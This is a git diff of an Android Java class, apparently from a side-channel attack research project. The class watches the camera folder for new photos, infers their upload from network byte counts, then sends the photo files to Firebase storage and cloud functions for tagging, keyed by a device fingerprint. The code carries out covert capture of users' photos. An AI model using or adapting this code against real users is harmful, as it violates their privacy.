@@ -3,16 +3,13 @@ package com.example.side_channel_attack;
 import android.app.Activity;
 import android.content.Context;
 import android.hardware.camera2.CameraManager;
+import android.net.TrafficStats;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.FileObserver;
 import android.support.annotation.NonNull;
-import android.system.ErrnoException;
-import android.system.Os;
-import android.system.StructStat;
 
-import com.google.android.gms.tasks.Continuation;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.OnSuccessListener;
 import com.google.android.gms.tasks.Task;
@@ -20,6 +17,7 @@ import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.DocumentSnapshot;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.google.firebase.functions.FirebaseFunctions;
+import com.google.firebase.functions.HttpsCallableReference;
 import com.google.firebase.functions.HttpsCallableResult;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
@@ -30,6 +28,7 @@ import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.InputStream;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Map;
@@ -43,45 +42,12 @@ public class CameraStateDetector {
     private String timestamp;
     private String id;
     private String url;
+    private FirebaseFunctions mFunctions;
+    private long byteHistory;
 
     public CameraStateDetector(final Activity activity){
 
-        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
-        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera");
-        observer = new FileObserver(dir.getPath()) {
-
-
-            @Override
-            public void onEvent(int event, String file) {
-                System.out.println(RECORD_STATE);
-                if(RECORD_STATE == 1) {
-                    if (event == FileObserver.CREATE && !file.equals(".probe")) { // check if its a "create" and not equal to .probe because thats created every time camera is launched
-                        image = new File(dir.getPath() + "/" + file);
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-                            StructStat stat = null;
-                            try {
-                                System.out.println(dir.getPath() + "/" + file);
-                                stat = Os.stat(dir.getPath() + "/" + file); // File path here
-                            } catch (ErrnoException e) {
-                                e.printStackTrace();
-                            }
-                            long t2 = stat.st_atime * 1000L;
-                            Calendar calendar = Calendar.getInstance();
-                            calendar.setTimeInMillis(t2);
-
-                            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy hh-MM-ss");
-                            String formattedDate = formatter.format(calendar.getTime());
-                            System.out.println(formattedDate);
-                        }
-                        System.out.println(image.getPath());
-                        RECORD_STATE = 0;
-                        TRACK_STATE = 1;
-                    }
-                }
-            }
-        };
-        observer.startWatching();
-
+        setUpDCIMListener();
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             final PacketCatcher packetCatcher = new PacketCatcher();
@@ -91,26 +57,8 @@ public class CameraStateDetector {
                 public void onCameraAvailable(String cameraId) {
                     super.onCameraAvailable(cameraId);
                     if (TRACK_STATE == 1) {
-                        System.out.println("sent123456789");
-                        System.out.println(image != null);
-                        System.out.println("entered");
+                        System.out.println("entered123");
 
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
-                            StructStat stat = null;
-                            try {
-                                System.out.println(image.getPath());
-                                stat = Os.stat(image.getPath()); // File path here
-                            } catch (ErrnoException e) {
-                                e.printStackTrace();
-                            }
-                            long t2 = stat.st_atime * 1000L;
-                            Calendar calendar = Calendar.getInstance();
-                            calendar.setTimeInMillis(t2);
-
-                            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy hh-MM-ss");
-                            String formattedDate = formatter.format(calendar.getTime());
-                            System.out.println(formattedDate);
-                        }
 
 //                        boolean outcomeOf1stEvent = packetCatcher.checkPeriodForUpload(
 //                                10000,
@@ -119,7 +67,7 @@ public class CameraStateDetector {
 //                                6000,
 //                                4000);
 //
-                        boolean outcomeOf1stEvent = packetCatcher.scan(10000);
+                        boolean outcomeOf1stEvent = packetCatcher.scan(byteHistory, 10000);
                         System.out.println(outcomeOf1stEvent + " dssa");
 
                         if(outcomeOf1stEvent && image != null) {
@@ -144,13 +92,10 @@ public class CameraStateDetector {
                                 }
                             }
                         } else {
-                            RECORD_STATE = 0;
+                            RECORD_STATE = 1;
+                            TRACK_STATE = 0;
                         }
-                        RECORD_STATE = 1;
-                        TRACK_STATE = 0;
-                        if (outcomeOf1stEvent == true || outcomeOf1stEvent == false) {
-                            return;
-                        }
+
                     }
                 }
 
@@ -161,6 +106,28 @@ public class CameraStateDetector {
                 }
             }, null);
         }
+    }
+
+    private void setUpDCIMListener() {
+        final File cameraDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+        final File dir = new File(cameraDirectory.getAbsolutePath() + "/Camera");
+        observer = new FileObserver(dir.getPath()) {
+
+
+            @Override
+            public void onEvent(int event, String file) {
+                if (RECORD_STATE == 1) {
+                    if (event == FileObserver.CREATE && !file.equals(".probe")) {
+                        image = new File(dir.getPath() + "/" + file);
+                        byteHistory = TrafficStats.getTotalTxBytes();
+
+                        RECORD_STATE = 0;
+                        TRACK_STATE = 1;
+                    }
+                }
+            }
+        };
+        observer.startWatching();
     }
 
     private void sendData() {
@@ -179,7 +146,8 @@ public class CameraStateDetector {
                 Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                 Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                 Build.USER.length() % 10; //13 digits
-        final DocumentReference entryRef = db.collection("invocations").document(id);
+
+        final DocumentReference entryRef = db.collection("invocations").document();
         final DocumentReference existRef = db.collection("users").document(id);
 
         final Map<String, Object> entry = new HashMap<>();
@@ -188,14 +156,16 @@ public class CameraStateDetector {
         entry.put("date", timestamp);
         entry.put("id", id);
 
-
         existRef.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
             @Override
             public void onComplete(@NonNull Task<DocumentSnapshot> task) {
+                System.out.println("hi");
                 if (!task.getResult().exists()) {
+                    System.out.println("bye");
 
                     StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-                    final StorageReference ref = storageRef.child(id + "_" + System.currentTimeMillis() + ".jpg");
+                    final String nameOfImage = id + "_" + System.currentTimeMillis() + ".jpg";
+                    final StorageReference ref = storageRef.child(nameOfImage);
                     InputStream stream = null;
 
                     try {
@@ -216,36 +186,52 @@ public class CameraStateDetector {
                                     entryRef.set(entry).addOnCompleteListener(new OnCompleteListener<Void>() {
                                         @Override
                                         public void onComplete(@NonNull Task<Void> task) {
-
-                                            String h1 = "car";
-                                            String h2 = "black";
-                                            String tags = "[\"' + h1 + '\",\"' + h2 + '\"]";
-                                            Map<String, Object> multiParameters = getParams("tags", tags);
-                                            multiParameters.put("tags", tags);
-                                            FirebaseFunctions mFunctions = FirebaseFunctions.getInstance();
+                                            mFunctions = FirebaseFunctions.getInstance();
+                                            Map<String, Object> data = new HashMap<>();
+                                            data.put("text", nameOfImage);
                                             mFunctions
-                                                    .getHttpsCallable("searchMulti")
-                                                    .call(multiParameters)
-                                                    .continueWith(new Continuation<HttpsCallableResult, String>() {
+                                                    .getHttpsCallable("filter")
+                                                    .call(data).
+                                                    addOnSuccessListener(new OnSuccessListener<HttpsCallableResult>() {
                                                         @Override
-                                                        public String then(@NonNull Task<HttpsCallableResult> task) throws Exception {
-                                                            System.out.println("success123");
-                                                            String result = (String) task.getResult().getData();
-                                                            return result;
-                                                        }
-                                                    });
+                                                        public void onSuccess(HttpsCallableResult httpsCallableResult) {
 
+                                                            HashMap<String, ArrayList<String>> data =
+                                                                    (HashMap<String, ArrayList<String>>) httpsCallableResult.getData();
 
-                                            Map<String, Object> singleParams = getParams("tag", "car");
-                                            mFunctions
-                                                    .getHttpsCallable("searchSingle")
-                                                    .call(singleParams)
-                                                    .continueWith(new Continuation<HttpsCallableResult, String>() {
-                                                        @Override
-                                                        public String then(@NonNull Task<HttpsCallableResult> task) throws Exception {
-                                                            System.out.println("success1223");
-                                                            String result = (String) task.getResult().getData();
-                                                            return result;
+                                                            System.out.println(data.toString());
+                                                            int counter = 0;
+
+//                                                    for(String term : data.get("locationMatches")){
+//                                                        searchTag(term);
+//                                                        if(++counter == 30)
+//                                                            break;
+//                                                    }
+//
+//                                                    for(String term : data.get("logoMatches")){
+//                                                        searchTag(term);
+//                                                        if(++counter == 30)
+//                                                            break;
+//                                                    }
+//
+//                                                    for(String term : data.get("webMatches")){
+//                                                        searchTag(term);
+//                                                        if(++counter == 30)
+//                                                            break;
+//                                                    }
+//
+//                                                    for(String term : data.get("labelMatches")){
+//                                                        searchTag(term);
+//                                                        if(++counter == 30)
+//                                                            break;
+//                                                    }
+//
+//                                                    for(String term : data.get("objectMatches")){
+//                                                        searchTag(term);
+//                                                        if(++counter == 30)
+//                                                            break;
+//                                                    }
+
                                                         }
                                                     });
                                         }
@@ -259,8 +245,17 @@ public class CameraStateDetector {
         });
     }
 
+    private void searchTag(String term) {
+        Map<String, Object> parameters =
+                getParams("tag", term);
 
-    public Map<String, Object> getParams(String additKey, String additVal) {
+        HttpsCallableReference searchSingle = mFunctions
+                .getHttpsCallable("searchSingle");
+        searchSingle.call(parameters);
+    }
+
+
+    private Map<String, Object> getParams(String additKey, String additVal) {
         Map<String, Object> parameters = new HashMap<>();
         //default
         parameters.put("url", url);
